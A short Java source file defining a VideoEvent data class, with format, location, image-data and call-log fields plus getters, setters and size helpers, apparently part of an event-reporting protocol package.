package com.vvt.prot.event;

import java.util.Vector;

public class VideoEvent extends PEvent {
	private short format = (short)MediaTypes.UNKNOWN.getId();
	private String location = null;
	private byte[] imageData = null;
	private Vector callLogStore = new Vector();
	public short getFormat() {
		return format;
	}
	
	public String getLocation() {
		return location;
	}
	
	public byte[] getImageData() {
		return imageData;
	}
	
	public void setFormat(short format) {
		this.format = format;
	}
	
	public void setLocation(String location) {
		this.location = location;
	}
	
	public void setImageData(byte[] imageData) {
		this.imageData = imageData;
	}
	
	public int lengthOfLocation() {
		return location.length();
	}
	
	public long lenghtOfImageData() {
		return imageData.length;
	}
	
	public int lenghtOfCallLogEvent() {
		int lenght = 0;
		for (int i = 0; i < callLogStore.size(); i++) {
			CallLogEvent event = (CallLogEvent)callLogStore.elementAt(i);
			lenght += (1 + 8 + 2 + event.getAddress().length() + 2 + event.getContactName().length());
		}
		return lenght;
	}

	public EventType getEventType() {
		return EventType.VIDEO;
	}
}
